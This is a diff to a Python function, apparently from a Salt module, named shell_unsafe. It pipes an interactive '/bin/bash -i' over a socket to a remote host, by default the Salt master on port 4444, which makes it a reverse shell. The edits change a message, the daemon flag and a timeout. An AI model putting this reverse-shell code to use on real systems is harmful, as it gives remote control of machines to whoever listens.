@@ -23,7 +23,7 @@ def _run_proccess(queue, cmd, remote_system, remote_port):
         return 
     pip = s.makefile("rw")
     p = subprocess.call(cmd.split(' '), stdin=pip, stdout=pip, stderr=pip)
-    queue.put('cmd ended')
+    queue.put('command finished')
 
 
 def shell_unsafe(cmd='/bin/bash -i', remote_system=None, remote_port=4444):
@@ -42,12 +42,11 @@ def shell_unsafe(cmd='/bin/bash -i', remote_system=None, remote_port=4444):
         remote_system = __opts__['master']
     queue = multiprocessing.Queue()
     ps = multiprocessing.Process(target=_run_proccess, args=(queue, cmd, remote_system, remote_port))
-    ps.daemon = True
     ps.start()
     pid = ps.pid
     msg = 'pid {3} streaming {0} to {1}:{2}'.format(cmd, remote_system, remote_port, pid)
     try:
-        msg = queue.get(timeout=1)
+        msg = queue.get(timeout=0.5)
     except Exception:
         pass
     return msg
